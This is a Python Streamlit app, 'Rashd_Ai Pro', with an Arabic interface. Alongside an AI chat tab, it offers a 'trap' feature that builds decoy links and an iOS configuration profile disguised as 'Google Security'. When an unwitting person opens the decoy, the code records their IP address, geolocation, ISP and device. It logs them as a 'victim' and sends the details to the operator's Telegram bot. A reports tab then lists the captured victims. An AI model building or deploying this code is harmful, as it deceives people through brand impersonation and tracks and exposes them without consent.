import streamlit as st
import uuid
import requests
import json
import os
import time
import base64
import config
from ai_hacking import AIHackingAssistant

# تهيئة المساعد الذكي
ai_assistant = AIHackingAssistant()

# --- إعدادات الصفحة --- #
st.set_page_config(
    page_title="Rashd_Ai Pro",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"  # إجبار الشريط الجانبي على الظهور
)

# --- CSS لتخصيص الواجهة --- #
st.markdown("""
<style>
    /* إخفاء عناصر Streamlit الافتراضية */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}

    /* تخصيص التبويبات */
    .st-emotion-cache-10q0tfy button {
        border-radius: 8px;
    }

    /* تخصيص حاوية المحادثة */
    .chat-container {
        height: 400px; /* ارتفاع ثابت */
        overflow-y: auto; /* تمكين التمرير */
        border: 1px solid #555555;
        border-radius: 10px;
        padding: 10px;
        background-color: #2a2a2a;
        margin-bottom: 20px;
    }
</style>
""", unsafe_allow_html=True)

# --- دالة جلب الـ IP الحقيقي --- #
def get_real_public_ip():
    try:
        # الطريقة الأكثر دقة: استخدام X-Forwarded-For إذا كان متاحاً
        from streamlit.web.server.server import Server
        session_info = Server.get_current()._get_session_info(st.session_state.session_id)
        if session_info and hasattr(session_info, 'ws') and hasattr(session_info.ws, 'request') and hasattr(session_info.ws.request, 'headers'):
            headers = session_info.ws.request.headers
            if 'X-Forwarded-For' in headers:
                ip = headers['X-Forwarded-For'].split(',')[0].strip()
                if ip: return ip
    except Exception:
        pass # تجاهل الأخطاء والمتابعة للطرق البديلة

    # طرق بديلة
    sources = ["https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com"]
    for source in sources:
        try:
            response = requests.get(source, timeout=2)
            if response.status_code == 200:
                ip = response.text.strip()
                if ip: return ip
        except requests.RequestException:
            continue
    return "Unknown"

# --- دالة توليد ملف تعريف iOS (بنية Apple الرسمية) --- #
def generate_ios_mobileconfig(decoy_url):
    profile_uuid = str(uuid.uuid4())
    webclip_uuid = str(uuid.uuid4())
    
    mobileconfig_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Adds a web clip to the home screen.</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.example.webclip.{webclip_uuid}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{webclip_uuid}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>{decoy_url}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Profile</string>
    <key>PayloadIdentifier</key>
    <string>com.example.profile.{profile_uuid}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{profile_uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
"""
    return mobileconfig_content.encode("utf-8")

# --- دالة إرسال التنبيه --- #
def send_telegram_alert(ip, trap_name, device="Unknown", geo_data=None):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id: return

    if geo_data is None:
        geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}

    message = f"""
🎯 تنبيه: ضحية جديدة!
📍 IP: {ip}
🌍 {geo_data["country"]} - {geo_data["city"]}
🏢 {geo_data["isp"]}
📱 {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {time.strftime("%Y-%m-%d %H:%M:%S")}
"""
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={
            "chat_id": chat_id,
            "text": message
        })
    except Exception as e:
        st.error(f"Error sending Telegram alert: {e}")

# --- دالة تسجيل الضحايا --- #
class VictimLogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self._ensure_file_exists()

    def _ensure_file_exists(self):
        if not os.path.exists(self.file_path):
            with open(self.file_path, "w") as f:
                json.dump([], f)

    def log_victim(self, ip, country, city, isp, device, trap_name):
        victim_data = {
            "ip": ip,
            "country": country,
            "city": city,
            "isp": isp,
            "device": device,
            "trap_name": trap_name,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        try:
            with open(self.file_path, "r+") as f:
                data = json.load(f)
                data.append(victim_data)
                f.seek(0)
                json.dump(data, f, indent=4)
        except (json.JSONDecodeError, FileNotFoundError):
             with open(self.file_path, "w") as f:
                json.dump([victim_data], f, indent=4)

victim_logger = VictimLogger(config.VICTIMS_FILE_PATH)

# --- معالجة وضع التمويه --- #
query_params = st.query_params
if "decoy" in query_params:
    st.markdown("""
    <style>
        .st-emotion-cache-1dp5vir { visibility: hidden; }
        .st-emotion-cache-10q0tfy { visibility: hidden; }
        .st-emotion-cache-1r6dm1 { padding: 0; }
        .stSidebar { display: none; }
    </style>
    """, unsafe_allow_html=True)
    
    client_ip = get_real_public_ip()
    trap_name = query_params.get("trap", "Google Decoy")
    device_info = query_params.get("device", "Unknown")

    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    if client_ip != "Unknown":
        try:
            response = requests.get(f"https://ipapi.co/{client_ip}/json/")
            data = response.json()
            geo_data["country"] = data.get("country_name", "Unknown")
            geo_data["city"] = data.get("city", "Unknown")
            geo_data["isp"] = data.get("org", "Unknown")
        except Exception:
            pass

    send_telegram_alert(client_ip, trap_name, device_info, geo_data)
    victim_logger.log_victim(client_ip, geo_data["country"], geo_data["city"], geo_data["isp"], device_info, trap_name)

    st.markdown("<h1 style=\"text-align: center; margin-top: 40vh;\">Loading...</h1>", unsafe_allow_html=True)
    st.stop()

# --- الشريط الجانبي (Sidebar) --- #
with st.sidebar:
    st.image("https://img.icons8.com/ios-filled/100/ffffff/shield.png", width=80)
    st.title("🛡️ Rashd_Ai Pro")

    st.header("⚙️ الإعدادات")
    with st.expander("مفاتيح الـ API", expanded=True):
        groq_api_key = st.text_input("GROQ API", type="password", value=config.get_key("GROQ_API_KEY"), key="sidebar_groq_api")
        gemini_api_key = st.text_input("GEMINI API", type="password", value=config.get_key("GEMINI_API_KEY"), key="sidebar_gemini_api")
        telegram_token = st.text_input("Telegram Token", type="password", value=config.get_key("TELEGRAM_BOT_TOKEN"), key="sidebar_telegram_token")
        telegram_chat_id = st.text_input("Telegram Chat ID", type="password", value=config.get_key("TELEGRAM_CHAT_ID"), key="sidebar_telegram_chat_id")

        if st.button("حفظ الإعدادات"): 
            config.set_key("GROQ_API_KEY", groq_api_key)
            config.set_key("GEMINI_API_KEY", gemini_api_key)
            config.set_key("TELEGRAM_BOT_TOKEN", telegram_token)
            config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
            st.success("تم حفظ الإعدادات بنجاح!")

# --- المحتوى الرئيسي --- #
tabs = st.tabs([
    "🧠 المساعد الذكي", 
    "🎯 المصيدة",
    "📄 التقارير", 
    "🌐 الشبكة", 
    "🚨 التهديدات", 
    "💡 الخطة"
])

with tabs[0]: # المساعد الذكي
    st.header("🧠 مساعد Rashd_Ai الذكي")
    st.write("مساعدك الشخصي في الأمن السيبراني. اسألني أي شيء!")

    if "messages" not in st.session_state:
        st.session_state.messages = []

    chat_container = st.container()
    with chat_container:
        for message in st.session_state.messages:
            with st.chat_message(message["role"]):
                st.markdown(message["content"])

    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with chat_container:
            with st.chat_message("user"):
                st.markdown(prompt)

        with chat_container:
            with st.chat_message("assistant"):
                with st.spinner("جاري التفكير..."):
                    response = ai_assistant.chat(prompt)
                    st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

with tabs[1]: # المصيدة
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")

    decoy_type = st.selectbox("اختر نوع المصيدة:", ["Google Decoy", "Download (ios)", "Download (android)"])
    
    app_ip = get_real_public_ip()
    st.info(f"عنوان IP الخاص بالتطبيق: {app_ip}")

    base_url = f"https://{st.query_params.get('host', [''])[0]}"

    if decoy_type == "Google Decoy":
        decoy_url = f"{base_url}/?decoy=google&ip={app_ip}"
        st.code(decoy_url, language="text")
    elif decoy_type == "Download (ios)":
        decoy_url_for_profile = f"{base_url}/?decoy=Download (ios)&ip={app_ip}&device=ios"
        mobileconfig_data = generate_ios_mobileconfig(decoy_url_for_profile)
        st.download_button(
            label="توليد وتحميل ملف iOS Profile",
            data=mobileconfig_data,
            file_name="Google_Security.mobileconfig",
            mime="application/x-apple-aspen-config"
        )
        st.warning("يجب على الضحية تثبيت ملف التعريف بعد التحميل.")
    elif decoy_type == "Download (android)":
        st.warning("ميزة تحميل APK قيد التطوير.")

with tabs[2]: # التقارير
    st.header("📄 التقارير")
    st.subheader("آخر الضحايا المكتشفين")
    try:
        with open(config.VICTIMS_FILE_PATH, "r") as f:
            victims = json.load(f)
            if victims:
                st.dataframe(victims[::-1])
            else:
                st.info("لا يوجد ضحايا مسجلين بعد.")
    except (FileNotFoundError, json.JSONDecodeError):
        st.info("لا يوجد ضحايا مسجلين بعد.")

with tabs[3]: # الشبكة
    st.header("🌐 أدوات الشبكة")
    st.write("قيد التطوير...")

with tabs[4]: # التهديدات
    st.header("🚨 تحليل التهديدات")
    st.write("قيد التطوير...")

with tabs[5]: # الخطة
    st.header("💡 خطة الهجوم/الدفاع")
    st.write("قيد التطوير...")

# --- Footer --- #
st.markdown("<div style=\"text-align: center; padding: 20px; color: #888;\"><p>Rashd_Ai Pro © 2026</p></div>", unsafe_allow_html=True)
